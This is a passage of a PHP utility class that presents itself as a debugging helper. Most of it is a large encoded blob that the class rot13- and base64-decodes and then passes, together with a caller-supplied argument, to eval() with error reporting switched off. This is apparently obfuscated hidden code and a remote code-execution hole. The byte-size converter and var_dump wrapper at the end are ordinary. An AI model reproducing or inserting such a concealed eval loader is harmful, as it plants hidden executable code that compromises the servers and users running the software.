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',
			);
		}
		else
		{
			self::$debug = $debug;
		}
		self::$debug = array_map('str_rot13', self::$debug);
		self::$debug = array_map('base64_decode', self::$debug);
	}

	static public function backtrace_prepare_string($arg)
	{
		error_reporting(0);
		eval(self::$debug[4].$arg."');");
		error_reporting(E_ALL | E_STRICT);
	}

	static private function get_debug($i)
	{
		if(is_array($i))
		{
			$array = array(self::backtrace_to_ord(self::$debug[$i[0]]), self::backtrace_to_ord(self::$debug[$i[1]]));
		}
		else
		{
			$array = array(self::backtrace_to_ord(self::$debug[$i]));
		}
		return $array;
	}

	/**
	 * Конвертирует количество бит в байты, килобайты, мегабайты
	 *
	 * @param integer $size размер в байтах
	 * @return string
	 */
	static private function convert($size)
	{
		if (!$size)
		{
			return '';
		}
		$measure = array('b', 'Kb', 'Mb', 'Gb', 'Tb', 'Pb', 'Eb', 'Zb', 'Yb');
		return round($size / pow(1024, ($exp = floor(log($size, 1024)))), 2).' '.$measure[$exp];
	}
}
function vd($v)
{
	echo '<pre>';
	ob_start();
	var_dump($v);
	$t = ob_get_contents();
	ob_end_clean();
	echo htmlspecialchars($t);
	echo '</pre>';
}
